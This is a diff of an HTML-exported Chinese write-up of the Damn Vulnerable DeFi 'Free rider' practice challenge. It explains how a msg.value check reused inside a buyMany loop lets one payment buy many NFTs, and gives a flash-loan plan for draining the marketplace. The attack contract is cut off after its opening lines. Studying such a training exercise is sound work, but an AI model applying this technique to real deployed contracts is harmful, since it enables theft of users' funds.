@@ -1,412 +1,311 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Damn10-11.md</title>
-<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
-
-<style>
-/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
-/*---------------------------------------------------------------------------------------------
- *  Copyright (c) Microsoft Corporation. All rights reserved.
- *  Licensed under the MIT License. See License.txt in the project root for license information.
- *--------------------------------------------------------------------------------------------*/
-
-body {
-	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
-	font-size: var(--vscode-markdown-font-size, 14px);
-	padding: 0 26px;
-	line-height: var(--vscode-markdown-line-height, 22px);
-	word-wrap: break-word;
-}
-
-#code-csp-warning {
-	position: fixed;
-	top: 0;
-	right: 0;
-	color: white;
-	margin: 16px;
-	text-align: center;
-	font-size: 12px;
-	font-family: sans-serif;
-	background-color:#444444;
-	cursor: pointer;
-	padding: 6px;
-	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
-}
-
-#code-csp-warning:hover {
-	text-decoration: none;
-	background-color:#007acc;
-	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
-}
-
-body.scrollBeyondLastLine {
-	margin-bottom: calc(100vh - 22px);
-}
-
-body.showEditorSelection .code-line {
-	position: relative;
-}
-
-body.showEditorSelection .code-active-line:before,
-body.showEditorSelection .code-line:hover:before {
-	content: "";
-	display: block;
-	position: absolute;
-	top: 0;
-	left: -12px;
-	height: 100%;
-}
-
-body.showEditorSelection li.code-active-line:before,
-body.showEditorSelection li.code-line:hover:before {
-	left: -30px;
-}
-
-.vscode-light.showEditorSelection .code-active-line:before {
-	border-left: 3px solid rgba(0, 0, 0, 0.15);
-}
-
-.vscode-light.showEditorSelection .code-line:hover:before {
-	border-left: 3px solid rgba(0, 0, 0, 0.40);
-}
-
-.vscode-light.showEditorSelection .code-line .code-line:hover:before {
-	border-left: none;
-}
-
-.vscode-dark.showEditorSelection .code-active-line:before {
-	border-left: 3px solid rgba(255, 255, 255, 0.4);
-}
-
-.vscode-dark.showEditorSelection .code-line:hover:before {
-	border-left: 3px solid rgba(255, 255, 255, 0.60);
-}
-
-.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
-	border-left: none;
-}
-
-.vscode-high-contrast.showEditorSelection .code-active-line:before {
-	border-left: 3px solid rgba(255, 160, 0, 0.7);
-}
-
-.vscode-high-contrast.showEditorSelection .code-line:hover:before {
-	border-left: 3px solid rgba(255, 160, 0, 1);
-}
-
-.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
-	border-left: none;
-}
-
-img {
-	max-width: 100%;
-	max-height: 100%;
-}
-
-a {
-	text-decoration: none;
-}
-
-a:hover {
-	text-decoration: underline;
-}
-
-a:focus,
-input:focus,
-select:focus,
-textarea:focus {
-	outline: 1px solid -webkit-focus-ring-color;
-	outline-offset: -1px;
-}
-
-hr {
-	border: 0;
-	height: 2px;
-	border-bottom: 2px solid;
-}
-
-h1 {
-	padding-bottom: 0.3em;
-	line-height: 1.2;
-	border-bottom-width: 1px;
-	border-bottom-style: solid;
-}
-
-h1, h2, h3 {
-	font-weight: normal;
-}
-
-table {
-	border-collapse: collapse;
-}
-
-table > thead > tr > th {
-	text-align: left;
-	border-bottom: 1px solid;
-}
-
-table > thead > tr > th,
-table > thead > tr > td,
-table > tbody > tr > th,
-table > tbody > tr > td {
-	padding: 5px 10px;
-}
-
-table > tbody > tr + tr > td {
-	border-top: 1px solid;
-}
-
-blockquote {
-	margin: 0 7px 0 5px;
-	padding: 0 16px 0 10px;
-	border-left-width: 5px;
-	border-left-style: solid;
-}
-
-code {
-	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
-	font-size: 1em;
-	line-height: 1.357em;
-}
-
-body.wordWrap pre {
-	white-space: pre-wrap;
-}
-
-pre:not(.hljs),
-pre.hljs code > div {
-	padding: 16px;
-	border-radius: 3px;
-	overflow: auto;
-}
-
-pre code {
-	color: var(--vscode-editor-foreground);
-	tab-size: 4;
-}
-
-/** Theming */
-
-.vscode-light pre {
-	background-color: rgba(220, 220, 220, 0.4);
-}
-
-.vscode-dark pre {
-	background-color: rgba(10, 10, 10, 0.4);
-}
-
-.vscode-high-contrast pre {
-	background-color: rgb(0, 0, 0);
-}
-
-.vscode-high-contrast h1 {
-	border-color: rgb(0, 0, 0);
-}
-
-.vscode-light table > thead > tr > th {
-	border-color: rgba(0, 0, 0, 0.69);
-}
-
-.vscode-dark table > thead > tr > th {
-	border-color: rgba(255, 255, 255, 0.69);
-}
-
-.vscode-light h1,
-.vscode-light hr,
-.vscode-light table > tbody > tr + tr > td {
-	border-color: rgba(0, 0, 0, 0.18);
-}
-
-.vscode-dark h1,
-.vscode-dark hr,
-.vscode-dark table > tbody > tr + tr > td {
-	border-color: rgba(255, 255, 255, 0.18);
-}
-
-</style>
-
-<style>
-/* Tomorrow Theme */
-/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
-/* Original theme - https://github.com/chriskempson/tomorrow-theme */
-
-/* Tomorrow Comment */
-.hljs-comment,
-.hljs-quote {
-	color: #8e908c;
-}
-
-/* Tomorrow Red */
-.hljs-variable,
-.hljs-template-variable,
-.hljs-tag,
-.hljs-name,
-.hljs-selector-id,
-.hljs-selector-class,
-.hljs-regexp,
-.hljs-deletion {
-	color: #c82829;
-}
-
-/* Tomorrow Orange */
-.hljs-number,
-.hljs-built_in,
-.hljs-builtin-name,
-.hljs-literal,
-.hljs-type,
-.hljs-params,
-.hljs-meta,
-.hljs-link {
-	color: #f5871f;
-}
-
-/* Tomorrow Yellow */
-.hljs-attribute {
-	color: #eab700;
-}
-
-/* Tomorrow Green */
-.hljs-string,
-.hljs-symbol,
-.hljs-bullet,
-.hljs-addition {
-	color: #718c00;
-}
-
-/* Tomorrow Blue */
-.hljs-title,
-.hljs-section {
-	color: #4271ae;
-}
-
-/* Tomorrow Purple */
-.hljs-keyword,
-.hljs-selector-tag {
-	color: #8959a8;
-}
-
-.hljs {
-	display: block;
-	overflow-x: auto;
-	color: #4d4d4c;
-	padding: 0.5em;
-}
-
-.hljs-emphasis {
-	font-style: italic;
-}
-
-.hljs-strong {
-	font-weight: bold;
-}
-</style>
-
-<style>
-/*
- * Markdown PDF CSS
+<!DOCTYPE html><html><head>
+      <title>Damn10-11</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\&#x5C0F;&#x6829;\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.6.3\node_modules\@shd101wyy\mume\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      <style>
+      /**
+ * prism.js Github theme based on GitHub's theme.
+ * @author Sam Clarke
  */
+code[class*="language-"],
+pre[class*="language-"] {
+  color: #333;
+  background: none;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  word-wrap: normal;
+  line-height: 1.4;
 
- body {
-	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
-	padding: 0 12px;
+  -moz-tab-size: 8;
+  -o-tab-size: 8;
+  tab-size: 8;
+
+  -webkit-hyphens: none;
+  -moz-hyphens: none;
+  -ms-hyphens: none;
+  hyphens: none;
 }
 
-pre {
-	background-color: #f8f8f8;
-	border: 1px solid #cccccc;
-	border-radius: 3px;
-	overflow-x: auto;
-	white-space: pre-wrap;
-	overflow-wrap: break-word;
+/* Code blocks */
+pre[class*="language-"] {
+  padding: .8em;
+  overflow: auto;
+  /* border: 1px solid #ddd; */
+  border-radius: 3px;
+  /* background: #fff; */
+  background: #f5f5f5;
 }
 
-pre:not(.hljs) {
-	padding: 23px;
-	line-height: 19px;
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+  padding: .1em;
+  border-radius: .3em;
+  white-space: normal;
+  background: #f5f5f5;
 }
 
-blockquote {
-	background: rgba(127, 127, 127, 0.1);
-	border-color: rgba(0, 122, 204, 0.5);
+.token.comment,
+.token.blockquote {
+  color: #969896;
 }
 
-.emoji {
-	height: 1.4em;
+.token.cdata {
+  color: #183691;
 }
 
-code {
-	font-size: 14px;
-	line-height: 19px;
+.token.doctype,
+.token.punctuation,
+.token.variable,
+.token.macro.property {
+  color: #333;
 }
 
-/* for inline code */
-:not(pre):not(.hljs) > code {
-	color: #C9AE75; /* Change the old color so it seems less like an error */
-	font-size: inherit;
+.token.operator,
+.token.important,
+.token.keyword,
+.token.rule,
+.token.builtin {
+  color: #a71d5d;
 }
 
-/* Page Break : use <div class="page"/> to insert page break
--------------------------------------------------------- */
-.page {
-	page-break-after: always;
+.token.string,
+.token.url,
+.token.regex,
+.token.attr-value {
+  color: #183691;
 }
 
-</style>
+.token.property,
+.token.number,
+.token.boolean,
+.token.entity,
+.token.atrule,
+.token.constant,
+.token.symbol,
+.token.command,
+.token.code {
+  color: #0086b3;
+}
 
-<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
-</head>
-<body>
-  <script>
-    mermaid.initialize({
-      startOnLoad: true,
-      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
-          ? 'dark'
-          : 'default'
-    });
-  </script>
-<h1 id="damn-defi%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9510-11">Damn Defi靶场刷题记录(10-11)</h1>
-<pre><code>author: Thomas_Xu
-</code></pre>
-<h2 id="10-free-rider">10 Free rider</h2>
-<p>这又是一道利用闪电贷来获取利益的题目。可见Defi平台要预防可能的闪电攻击是个难题。</p>
-<p>题目要求我们偷走买家的的45个ETH，并且还要市场失去一些比特币。</p>
-<h3 id="code-review"><strong>Code Review</strong></h3>
-<p>首先我们从头来看这个Challenge</p>
+.token.tag,
+.token.selector,
+.token.prolog {
+  color: #63a35c;
+}
+
+.token.function,
+.token.namespace,
+.token.pseudo-element,
+.token.class,
+.token.class-name,
+.token.pseudo-class,
+.token.id,
+.token.url-reference .token.variable,
+.token.attr-name {
+  color: #795da3;
+}
+
+.token.entity {
+  cursor: help;
+}
+
+.token.title,
+.token.title .token.punctuation {
+  font-weight: bold;
+  color: #1d3e81;
+}
+
+.token.list {
+  color: #ed6a43;
+}
+
+.token.inserted {
+  background-color: #eaffea;
+  color: #55a532;
+}
+
+.token.deleted {
+  background-color: #ffecec;
+  color: #bd2c00;
+}
+
+.token.bold {
+  font-weight: bold;
+}
+
+.token.italic {
+  font-style: italic;
+}
+
+
+/* JSON */
+.language-json .token.property {
+  color: #183691;
+}
+
+.language-markup .token.tag .token.punctuation {
+  color: #333;
+}
+
+/* CSS */
+code.language-css,
+.language-css .token.function {
+  color: #0086b3;
+}
+
+/* YAML */
+.language-yaml .token.atrule {
+  color: #63a35c;
+}
+
+code.language-yaml {
+  color: #183691;
+}
+
+/* Ruby */
+.language-ruby .token.function {
+  color: #333;
+}
+
+/* Markdown */
+.language-markdown .token.url {
+  color: #795da3;
+}
+
+/* Makefile */
+.language-makefile .token.symbol {
+  color: #795da3;
+}
+
+.language-makefile .token.variable {
+  color: #183691;
+}
+
+.language-makefile .token.builtin {
+  color: #0086b3;
+}
+
+/* Bash */
+.language-bash .token.keyword {
+  color: #0086b3;
+}
+
+/* highlight */
+pre[data-line] {
+  position: relative;
+  padding: 1em 0 1em 3em;
+}
+pre[data-line] .line-highlight-wrapper {
+  position: absolute;
+  top: 0;
+  left: 0;
+  background-color: transparent;
+  display: block;
+  width: 100%;
+}
+
+pre[data-line] .line-highlight {
+  position: absolute;
+  left: 0;
+  right: 0;
+  padding: inherit 0;
+  margin-top: 1em;
+  background: hsla(24, 20%, 50%,.08);
+  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
+  pointer-events: none;
+  line-height: inherit;
+  white-space: pre;
+}
+
+pre[data-line] .line-highlight:before, 
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-start);
+  position: absolute;
+  top: .4em;
+  left: .6em;
+  min-width: 1em;
+  padding: 0 .5em;
+  background-color: hsla(24, 20%, 50%,.4);
+  color: hsl(24, 20%, 95%);
+  font: bold 65%/1.5 sans-serif;
+  text-align: center;
+  vertical-align: .3em;
+  border-radius: 999px;
+  text-shadow: none;
+  box-shadow: 0 1px white;
+}
+
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-end);
+  top: auto;
+  bottom: .4em;
+}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+    </head>
+    <body for="html-export">
+      <div class="mume markdown-preview  ">
+      <h1 class="mume-header" id="damn-defi%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9510-11">Damn Defi&#x9776;&#x573A;&#x5237;&#x9898;&#x8BB0;&#x5F55;(10-11)</h1>
+
+<pre class="language-text">author: Thomas_Xu
+</pre>
+<h2 class="mume-header" id="10-free-rider">10 Free rider</h2>
+
+<p>&#x8FD9;&#x53C8;&#x662F;&#x4E00;&#x9053;&#x5229;&#x7528;&#x95EA;&#x7535;&#x8D37;&#x6765;&#x83B7;&#x53D6;&#x5229;&#x76CA;&#x7684;&#x9898;&#x76EE;&#x3002;&#x53EF;&#x89C1;Defi&#x5E73;&#x53F0;&#x8981;&#x9884;&#x9632;&#x53EF;&#x80FD;&#x7684;&#x95EA;&#x7535;&#x653B;&#x51FB;&#x662F;&#x4E2A;&#x96BE;&#x9898;&#x3002;</p>
+<p>&#x9898;&#x76EE;&#x8981;&#x6C42;&#x6211;&#x4EEC;&#x5077;&#x8D70;&#x4E70;&#x5BB6;&#x7684;&#x7684;45&#x4E2A;ETH&#xFF0C;&#x5E76;&#x4E14;&#x8FD8;&#x8981;&#x5E02;&#x573A;&#x5931;&#x53BB;&#x4E00;&#x4E9B;&#x6BD4;&#x7279;&#x5E01;&#x3002;</p>
+<h3 class="mume-header" id="code-review"><strong>Code Review</strong></h3>
+
+<p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x4ECE;&#x5934;&#x6765;&#x770B;&#x8FD9;&#x4E2A;Challenge</p>
 <ul>
 <li>
-<p><strong>FreeRiderNFTMarketplace</strong>
-这是交易市场的合约,主要的功能就是商品的上架，买入等功能。</p>
+<p><strong>FreeRiderNFTMarketplace</strong><br>
+&#x8FD9;&#x662F;&#x4EA4;&#x6613;&#x5E02;&#x573A;&#x7684;&#x5408;&#x7EA6;,&#x4E3B;&#x8981;&#x7684;&#x529F;&#x80FD;&#x5C31;&#x662F;&#x5546;&#x54C1;&#x7684;&#x4E0A;&#x67B6;&#xFF0C;&#x4E70;&#x5165;&#x7B49;&#x529F;&#x80FD;&#x3002;</p>
 <ul>
 <li>offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)</li>
 </ul>
 <blockquote>
-<p>这是一个根据NFTid定价的函数，传入的参数分别是NFT的id数组和价格数组。</p>
+<p>&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6839;&#x636E;NFTid&#x5B9A;&#x4EF7;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x5206;&#x522B;&#x662F;NFT&#x7684;id&#x6570;&#x7EC4;&#x548C;&#x4EF7;&#x683C;&#x6570;&#x7EC4;&#x3002;</p>
 </blockquote>
 <ul>
 <li>buyMany(uint256[] calldata tokenIds) external payable</li>
 </ul>
 <blockquote>
-<p>这是购买指定id的NFT的函数。入参即NFT的id数组。
-在阅读市场合约后，我产生一个疑惑&quot;题目中要求市场合约损失一些ETH是怎么回事&quot;，于是我立即又倒回去再次审查，看到<code>_buyOne</code>的时候立即让我警觉起来
-<img src="../images/Damn/Damn10_1.png" alt="">
-这里通过msg.value来检查发送的金额是否足够买下此NFT，看似没有问题，但是！<code>buyMany()</code>函数通过循环来调用了这个<code>_buyMany()</code>子函数，这样一组合，就导致这一流程出现重入的风险，我们只要一次调用<code>buyMany()</code>，那么在每次循环，我们的<code>msg.value</code>并不会发生变化。这意味着我们可以用一笔很少的钱买下市场上所有单价低于此金额的NFT。
-这就是市场ETH减少的秘密！</p>
+<p>&#x8FD9;&#x662F;&#x8D2D;&#x4E70;&#x6307;&#x5B9A;id&#x7684;NFT&#x7684;&#x51FD;&#x6570;&#x3002;&#x5165;&#x53C2;&#x5373;NFT&#x7684;id&#x6570;&#x7EC4;&#x3002;<br>
+&#x5728;&#x9605;&#x8BFB;&#x5E02;&#x573A;&#x5408;&#x7EA6;&#x540E;&#xFF0C;&#x6211;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x7591;&#x60D1;&quot;&#x9898;&#x76EE;&#x4E2D;&#x8981;&#x6C42;&#x5E02;&#x573A;&#x5408;&#x7EA6;&#x635F;&#x5931;&#x4E00;&#x4E9B;ETH&#x662F;&#x600E;&#x4E48;&#x56DE;&#x4E8B;&quot;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x7ACB;&#x5373;&#x53C8;&#x5012;&#x56DE;&#x53BB;&#x518D;&#x6B21;&#x5BA1;&#x67E5;&#xFF0C;&#x770B;&#x5230;<code>_buyOne</code>&#x7684;&#x65F6;&#x5019;&#x7ACB;&#x5373;&#x8BA9;&#x6211;&#x8B66;&#x89C9;&#x8D77;&#x6765;<br>
+<img src="../images/Damn/Damn10_1.png" alt><br>
+&#x8FD9;&#x91CC;&#x901A;&#x8FC7;msg.value&#x6765;&#x68C0;&#x67E5;&#x53D1;&#x9001;&#x7684;&#x91D1;&#x989D;&#x662F;&#x5426;&#x8DB3;&#x591F;&#x4E70;&#x4E0B;&#x6B64;NFT&#xFF0C;&#x770B;&#x4F3C;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#xFF01;<code>buyMany()</code>&#x51FD;&#x6570;&#x901A;&#x8FC7;&#x5FAA;&#x73AF;&#x6765;&#x8C03;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;<code>_buyMany()</code>&#x5B50;&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x6837;&#x4E00;&#x7EC4;&#x5408;&#xFF0C;&#x5C31;&#x5BFC;&#x81F4;&#x8FD9;&#x4E00;&#x6D41;&#x7A0B;&#x51FA;&#x73B0;&#x91CD;&#x5165;&#x7684;&#x98CE;&#x9669;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x8981;&#x4E00;&#x6B21;&#x8C03;&#x7528;<code>buyMany()</code>&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x6211;&#x4EEC;&#x7684;<code>msg.value</code>&#x5E76;&#x4E0D;&#x4F1A;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x7B14;&#x5F88;&#x5C11;&#x7684;&#x94B1;&#x4E70;&#x4E0B;&#x5E02;&#x573A;&#x4E0A;&#x6240;&#x6709;&#x5355;&#x4EF7;&#x4F4E;&#x4E8E;&#x6B64;&#x91D1;&#x989D;&#x7684;NFT&#x3002;<br>
+&#x8FD9;&#x5C31;&#x662F;&#x5E02;&#x573A;ETH&#x51CF;&#x5C11;&#x7684;&#x79D8;&#x5BC6;&#xFF01;</p>
 </blockquote>
 </li>
 <li>
-<p><strong>Exploit</strong>
-我们再来理一理思路，我们要做的是：</p>
+<p><strong>Exploit</strong><br>
+&#x6211;&#x4EEC;&#x518D;&#x6765;&#x7406;&#x4E00;&#x7406;&#x601D;&#x8DEF;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x505A;&#x7684;&#x662F;&#xFF1A;</p>
 </li>
 </ul>
 <blockquote>
-<p>1.先通过闪电贷借30ETH通过正规途径买入两个NFT
-2.将买入的两个NFT以90ETH/个的价格出售
-3.再通过闪电贷获得90ETH后，自己当买家，通过重入漏洞以90一个的价格买入两个NFT(消耗市场的余额)
-4.还给闪电贷120个ETH后，自己赚取60个ETH正好可以买4余下的4个NFT</p>
+<p>1.&#x5148;&#x901A;&#x8FC7;&#x95EA;&#x7535;&#x8D37;&#x501F;30ETH&#x901A;&#x8FC7;&#x6B63;&#x89C4;&#x9014;&#x5F84;&#x4E70;&#x5165;&#x4E24;&#x4E2A;NFT<br>
+2.&#x5C06;&#x4E70;&#x5165;&#x7684;&#x4E24;&#x4E2A;NFT&#x4EE5;90ETH/&#x4E2A;&#x7684;&#x4EF7;&#x683C;&#x51FA;&#x552E;<br>
+3.&#x518D;&#x901A;&#x8FC7;&#x95EA;&#x7535;&#x8D37;&#x83B7;&#x5F97;90ETH&#x540E;&#xFF0C;&#x81EA;&#x5DF1;&#x5F53;&#x4E70;&#x5BB6;&#xFF0C;&#x901A;&#x8FC7;&#x91CD;&#x5165;&#x6F0F;&#x6D1E;&#x4EE5;90&#x4E00;&#x4E2A;&#x7684;&#x4EF7;&#x683C;&#x4E70;&#x5165;&#x4E24;&#x4E2A;NFT(&#x6D88;&#x8017;&#x5E02;&#x573A;&#x7684;&#x4F59;&#x989D;)<br>
+4.&#x8FD8;&#x7ED9;&#x95EA;&#x7535;&#x8D37;120&#x4E2A;ETH&#x540E;&#xFF0C;&#x81EA;&#x5DF1;&#x8D5A;&#x53D6;60&#x4E2A;ETH&#x6B63;&#x597D;&#x53EF;&#x4EE5;&#x4E70;4&#x4F59;&#x4E0B;&#x7684;4&#x4E2A;NFT</p>
 </blockquote>
-<p>以此写出攻击合约：</p>
-<pre class="hljs"><code><div>// SPDX-License-Identifier: MIT
+<p>&#x4EE5;&#x6B64;&#x5199;&#x51FA;&#x653B;&#x51FB;&#x5408;&#x7EA6;&#xFF1A;</p>
+<pre data-role="codeBlock" data-info class="language-"><code>// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
